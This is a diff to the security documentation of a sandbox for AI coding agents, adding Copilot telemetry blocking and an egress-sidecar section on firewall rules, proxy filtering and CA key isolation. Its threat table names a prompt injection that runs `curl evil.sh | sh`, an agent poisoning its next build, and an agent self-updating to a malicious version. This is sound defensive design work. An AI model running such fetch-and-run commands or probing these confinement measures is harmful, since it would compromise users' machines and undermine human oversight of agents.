@@ -153,6 +153,9 @@ the container and:
   `api.enterprise.githubcopilot.com`, `copilot-proxy.githubusercontent.com`,
   `origin-tracker.githubusercontent.com`, `copilot-telemetry.githubusercontent.com`,
   `collector.github.com`, and `default.exp-tas.com`.
+- Copilot CLI telemetry (`telemetry.individual.githubcopilot.com` and its
+  business/enterprise counterparts) is deliberately not allowlisted, so no
+  Copilot telemetry leaves the sandbox; the CLI runs normally without it.
 - `--agent copilot` implies `--allow-github`. GitHub network access is enabled
   only by that flag or by selecting Copilot, never by prompt text: earlier
   releases opened it for `--agent bash` prompts whose first word was `copilot`.
@@ -266,7 +269,7 @@ Customize:
 | Prompt injection drives `curl evil.sh \| sh` | Blocked unless the C2 host is on the allowlist. |
 | Malicious npm post-install scripts | Run as the unprivileged `agent` user (host-matched for Docker/Podman on Linux); no access to unmounted host paths. |
 | Agent updates itself to a malicious version | `autoUpdaterStatus: disabled` for Claude and `check_for_update_on_startup = false` for Codex; `PI_SKIP_VERSION_CHECK=1` for Pi. OpenCode config is not currently sanitized; see `TODO.md`. |
-| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
+| Agent sends telemetry / usage data | `CLAUDE_TELEMETRY_DISABLED=1` for Claude; `analytics.enabled = false` and `feedback.enabled = false` for Codex; `PI_OFFLINE=1` for Pi (disables startup update/telemetry network calls); `OPENSPEC_TELEMETRY=0` for OpenSpec. For the Copilot CLI, telemetry is blocked at the network: its `telemetry.<plan>.githubcopilot.com` hosts are not on the allowlist, and the CLI works without them. OpenCode config is not currently filtered for telemetry settings; see `TODO.md`. |
 | API token leakage via process environment | Default forwarded agent tokens are passed through mounted credential files, not environment variables; host staging files are kept under a private `/tmp` directory. Explicit `--api-key-env*` injection is opt-in, requires `--no-forward-credentials`, and redacts dry-run output, but the selected keys are still present in the runtime process environment during real runs. |
 | Agent rewrites the project `--dockerfile` to poison the next build | The project Dockerfile's SHA256 is recorded under the masked `.project-sandbox/.dockerfile-checksums.json`, which the sandbox cannot read or modify; a later run warns when the Dockerfile changed since it was last built. |
 | Agent reads or edits `.devcontainer` host-path mounts and config | `/workspace/.devcontainer` is masked with an empty read-only mount in both direct runs and devcontainers. |
@@ -406,3 +409,73 @@ ambient proxies and follows no redirects, keeping the bearer key on the configur
 origin. Internet proxy authentication and client certificates are unsupported;
 HTTP 407 does not trigger credential acquisition or direct fallback. See
 [proxy endpoints](proxy-endpoints.md) for TLS scope and client limitations.
+
+## Egress sidecar
+
+`--egress sidecar` replaces IP pinning with one global Squid sidecar per
+runtime that filters by hostname; see [Egress sidecar](egress-sidecar.md). The
+parts that matter for security:
+
+- **Network boundary.** Every sidecar sandbox runs on the runtime's internal
+  network `sbx-egress`, which has no route to the Internet. `--no-firewall` is
+  rejected in this mode. The host is unreachable from the internal network on
+  Docker and Podman. On Apple `container` it is reachable, which is why the
+  firewall stays mandatory.
+- **Shared network, firewall-separated sandboxes.** All sidecar sandboxes of a
+  runtime share `sbx-egress`, so isolation *between* them rests on these checks
+  (global-egress-sidecar-macos, design.md Risks):
+  - The sandbox firewall (`init-firewall-sidecar.sh`, run as root before the
+    agent starts) sets `INPUT`, `FORWARD` and `OUTPUT` to default `DROP`,
+    accepts only loopback and `ESTABLISHED,RELATED` traffic, and admits new
+    outbound TCP only to the sidecar's IP on the proxy port (3128) and on this
+    session's local-service ports. IPv6 is dropped, or disabled when
+    `ip6tables` is unavailable. A sandbox therefore can neither open a
+    connection to another sandbox nor accept one.
+  - The agent runs without root, so it cannot change those rules.
+  - Squid refuses IP-literal destinations (`ip-literal`) and, in direct mode,
+    names that resolve to private, loopback, link-local or metadata addresses
+    (`private-address`), so the proxy cannot be used to reach another sandbox
+    either.
+  - Each sandbox's firewall opens only the forwarded ports its own session
+    uses, even when the sidecar forwards more for other sessions.
+
+  For stricter isolation, use firewall mode.
+- **One policy, out of reach.** The only policy is
+  `$XDG_CONFIG_HOME/project-sandbox/egress.toml`. It and the sidecar state
+  directory `$XDG_STATE_HOME/project-sandbox/egress/` (which holds the CA key)
+  must lie outside the project, the worktree, `.git`/`.jj` and every `--mount`
+  source, checked after resolving symlinks at every launch, so the agent can
+  neither widen the policy nor read the key. Rendered Squid config lives in the
+  state directory, never in the project. Every agent provider host is always
+  allowed. A hand edit of `egress.toml` applies to running sandboxes at the
+  next launch, `reload` or `allow`/`forward` edit; that is intended.
+- **Sidecar CA.** The sidecar owns one CA per runtime: EC P-256, `pathlen:0`,
+  with critical name constraints, valid for `[egress.ca] lifetime_days`
+  (default 7 days, at most 30).
+  - The constraint is `github.com` when the Copilot profile intercepts
+    `api.github.com`. It cannot be narrower, because Squid mimics GitHub's
+    `*.github.com` certificate names.
+  - Otherwise the constraint is the reserved name `invalid`, and the CA is not
+    mounted into any sandbox.
+  - The key lives in `egress/<runtime>/sidecar/ca-key.pem`, mode 0600 in a
+    0700 directory. It is mounted read-only into the sidecar only, never into a
+    sandbox, and deleted by `project-sandbox-egress down` or when the CA is
+    replaced. It now lives as long as the sidecar, up to 30 days, instead of
+    one session.
+  - The CA is reused across restarts while it has at least 2 days left and its
+    constraints match. While interception is active, launches warn within 2
+    days of expiry and refuse to start once it has expired.
+  - Only the public certificate enters a sandbox, and it is installed at
+    start-up, never baked into an image.
+- **GitHub.** Repository hosts cannot be allowlisted in this mode. The Copilot
+  profile admits only `/copilot_internal/` on `api.github.com`. Copilot CLI
+  telemetry and its update check are blocked.
+- **Parent proxy.** With `[egress.upstream] url`, the sidecar's policy is
+  hostname-only. The parent may reach intranet hosts, so the allowlist is the
+  only barrier to them. The upstream CA (`ca_cert`) is installed into each
+  sandbox's trust at start, not baked into its image. On Apple `container`
+  the loopback relay to a remote parent is a host process that persists while
+  the sidecar is up and listens on `127.0.0.1` only.
+- **Restarts.** `down` and `restart` do not check for users: running sidecar
+  sandboxes lose egress (they fail closed). Both commands list the attached
+  sandboxes first.
